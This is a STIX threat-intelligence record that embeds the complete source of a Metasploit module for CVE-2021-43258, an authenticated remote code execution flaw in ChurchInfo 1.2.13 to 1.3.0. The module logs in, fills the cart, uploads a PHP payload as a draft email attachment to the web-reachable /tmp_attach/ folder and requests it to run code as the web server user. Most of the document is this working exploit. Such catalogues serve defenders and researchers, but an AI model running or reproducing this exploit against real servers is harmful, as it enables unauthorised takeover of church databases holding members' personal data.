{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--802ac6e5-903d-4b31-b36d-f685b5ec3107",
    "created": "2024-08-14T17:10:46.885487Z",
    "modified": "2024-08-14T17:10:46.885492Z",
    "name": "ChurchInfo 1.2.13-1.3.0 Authenticated RCE",
    "description": " This module exploits the logic in the CartView.php page when crafting a draft email with an attachment. By uploading an attachment for a draft email, the attachment will be placed in the /tmp_attach/ folder of the ChurchInfo web server, which is accessible over the web by any user. By uploading a PHP attachment and then browsing to the location of the uploaded PHP file on the web server, arbitrary code execution as the web daemon user (e.g. www-data) can be achieved.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/churchinfo_upload_exec.rb",
            "external_id": "churchinfo_upload_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.churchdb.org/"
        },
        {
            "source_name": "reference",
            "url": "http://sourceforge.net/projects/churchinfo/"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-43258"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'ChurchInfo 1.2.13-1.3.0 Authenticated RCE',\n        'Description' => %q{\n          This module exploits the logic in the CartView.php page when crafting a draft email with an attachment.\n          By uploading an attachment for a draft email, the attachment will be placed in the /tmp_attach/ folder of the\n          ChurchInfo web server, which is accessible over the web by any user. By uploading a PHP attachment and\n          then browsing to the location of the uploaded PHP file on the web server, arbitrary code\n          execution as the web daemon user (e.g. www-data) can be achieved.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'm4lwhere <m4lwhere@protonmail.com>' ],\n        'References' => [\n          ['URL', 'http://www.churchdb.org/'],\n          ['URL', 'http://sourceforge.net/projects/churchinfo/'],\n          ['CVE', '2021-43258']\n        ],\n        'Platform' => 'php',\n        'Privileged' => false,\n        'Arch' => ARCH_PHP,\n        'Targets' => [['Automatic Targeting', { 'auto' => true }]],\n        'DisclosureDate' => '2021-10-30', # Reported to ChurchInfo developers on this date\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS]\n        }\n      )\n    )\n    # Set the email subject and message if interested\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('USERNAME', [true, 'Username for ChurchInfo application', 'admin']),\n        OptString.new('PASSWORD', [true, 'Password to login with', 'churchinfoadmin']),\n        OptString.new('TARGETURI', [true, 'The location of the ChurchInfo app', '/churchinfo/']),\n        OptString.new('EMAIL_SUBJ', [true, 'Email subject in webapp', 'Read this now!']),\n        OptString.new('EMAIL_MESG', [true, 'Email message in webapp', 'Hello there!'])\n      ]\n    )\n  end\n\n  def check\n    if datastore['SSL'] == true\n      proto_var = 'https'\n    else\n      proto_var = 'http'\n    end\n\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'Default.php'),\n      'method' => 'GET',\n      'vars_get' => {\n        'Proto' => proto_var,\n        'Path' => target_uri.path\n      }\n    )\n\n    unless res\n      return CheckCode::Unknown('Target did not respond to a request to its login page!')\n    end\n\n    # Check if page title is the one that ChurchInfo uses for its login page.\n    if res.body.match(%r{<title>ChurchInfo: Login</title>})\n      print_good('Target is ChurchInfo!')\n    else\n      return CheckCode::Safe('Target is not running ChurchInfo!')\n    end\n\n    # Check what version the target is running using the upgrade pages.\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'AutoUpdate', 'Update1_2_14To1_3_0.php'),\n      'method' => 'GET'\n    )\n\n    if res && (res.code == 500 || res.code == 200)\n      return CheckCode::Vulnerable('Target is running ChurchInfo 1.3.0!')\n    end\n\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'AutoUpdate', 'Update1_2_13To1_2_14.php'),\n      'method' => 'GET'\n    )\n\n    if res && (res.code == 500 || res.code == 200)\n      return CheckCode::Vulnerable('Target is running ChurchInfo 1.2.14!')\n    end\n\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'AutoUpdate', 'Update1_2_12To1_2_13.php'),\n      'method' => 'GET'\n    )\n\n    if res && (res.code == 500 || res.code == 200)\n      return CheckCode::Vulnerable('Target is running ChurchInfo 1.2.13!')\n    else\n      return CheckCode::Safe('Target is not running a vulnerable version of ChurchInfo!')\n    end\n  end\n\n  #\n  # The exploit method attempts a login, adds items to the cart, then creates the email attachment.\n  # Adding items to the cart is required for the server-side code to accept the upload.\n  #\n  def exploit\n    # Need to grab the PHP session cookie value first to pass to application\n    vprint_status('Gathering PHP session cookie')\n    if datastore['SSL'] == true\n      vprint_status('SSL is true, changing protocol to HTTPS')\n      proto_var = 'https'\n    else\n      vprint_status('SSL is false, leaving protocol as HTTP')\n      proto_var = 'http'\n    end\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'Default.php'),\n      'method' => 'GET',\n      'vars_get' => {\n        'Proto' => proto_var,\n        'Path' => datastore['RHOSTS'] + ':' + datastore['RPORT'].to_s + datastore['TARGETURI']\n      },\n      'keep_cookies' => true\n    )\n\n    # Ensure we get a 200 from the application login page\n    unless res && res.code == 200\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Unable to reach the ChurchInfo login page (response code: #{res.code})\")\n    end\n\n    # Check that we actually are targeting a ChurchInfo server.\n    unless res.body.match(%r{<title>ChurchInfo: Login</title>})\n      fail_with(Failure::NotVulnerable, 'Target is not a ChurchInfo!')\n    end\n\n    # Grab our assigned session cookie\n    cookie = res.get_cookies\n    vprint_good(\"PHP session cookie is #{cookie}\")\n    vprint_status('Attempting login')\n\n    # Attempt a login with the cookie assigned, server will assign privs on server-side if authenticated\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'Default.php'),\n      'method' => 'POST',\n      'vars_post' => {\n        'User' => datastore['USERNAME'],\n        'Password' => datastore['PASSWORD'],\n        'sURLPath' => datastore['TARGETURI']\n      }\n    )\n\n    # A valid login will give us a 302 redirect to TARGETURI + /CheckVersion.php so check that.\n    unless res && res.code == 302 && res.headers['Location'] == datastore['TARGETURI'] + '/CheckVersion.php'\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Check if credentials are correct (response code: #{res.code})\")\n    end\n    vprint_good(\"Location header is #{res.headers['Location']}\")\n    print_good(\"Logged into application as #{datastore['USERNAME']}\")\n    vprint_status('Attempting exploit')\n\n    # We must add items to the cart before we can send the emails. This is a hard requirement server-side.\n    print_status('Navigating to add items to cart')\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'SelectList.php'),\n      'method' => 'GET',\n      'vars_get' => {\n        'mode' => 'person',\n        'AddAllToCart' => 'Add+to+Cart'\n      }\n    )\n\n    # Need to check that items were successfully added to the cart\n    # Here we're looking through html for the version string, similar to:\n    # Items in Cart: 2\n    unless res && res.code == 200\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Unable to add items to cart via HTTP GET request to SelectList.php (response code: #{res.code})\")\n    end\n    cart_items = res.body.match(/Items in Cart: (?<cart>\\d)/)\n    unless cart_items\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Server did not respond with the text 'Items in Cart'. Is this a ChurchInfo server?\")\n    end\n    if cart_items['cart'].to_i < 1\n      print_error('No items in cart detected')\n      fail_with(Failure::UnexpectedReply,\n                'Failure to add items to cart, no items were detected. Check if there are person entries in the application')\n    end\n    print_good(\"Items in Cart: #{cart_items}\")\n\n    # Uploading exploit as temporary email attachment\n    print_good('Uploading exploit via temp email attachment')\n    payload_name = Rex::Text.rand_text_alphanumeric(5..14) + '.php'\n    vprint_status(\"Payload name is #{payload_name}\")\n\n    # Create the POST payload with required parameters to be parsed by the server\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(payload.encoded, 'application/octet-stream', nil,\n                       \"form-data; name=\\\"Attach\\\"; filename=\\\"#{payload_name}\\\"\")\n    post_data.add_part(datastore['EMAIL_SUBJ'], '', nil, 'form-data; name=\"emailsubject\"')\n    post_data.add_part(datastore['EMAIL_MESG'], '', nil, 'form-data; name=\"emailmessage\"')\n    post_data.add_part('Save Email', '', nil, 'form-data; name=\"submit\"')\n    file = post_data.to_s\n    file.strip!\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'CartView.php'),\n      'method' => 'POST',\n      'data' => file,\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\"\n    )\n\n    # Ensure that we get a 200 and the intended payload was\n    # successfully uploaded and attached to the draft email.\n    unless res.code == 200 && res.body.include?(\"Attach file:</b> #{payload_name}\")\n      fail_with(Failure::Unknown, 'Failed to upload the payload.')\n    end\n    print_good(\"Exploit uploaded to #{target_uri.path + 'tmp_attach/' + payload_name}\")\n\n    # Have our payload deleted after we exploit\n    register_file_for_cleanup(payload_name)\n\n    # Make a GET request to the PHP file that was uploaded to execute it on the target server.\n    print_good('Executing payload with GET request')\n    send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'tmp_attach', payload_name),\n      'method' => 'GET'\n    )\n  rescue ::Rex::ConnectionError\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-10-30, # Reported to ChurchInfo developers on this date",
    "x_mitre_platforms": [
        "php'"
    ]
}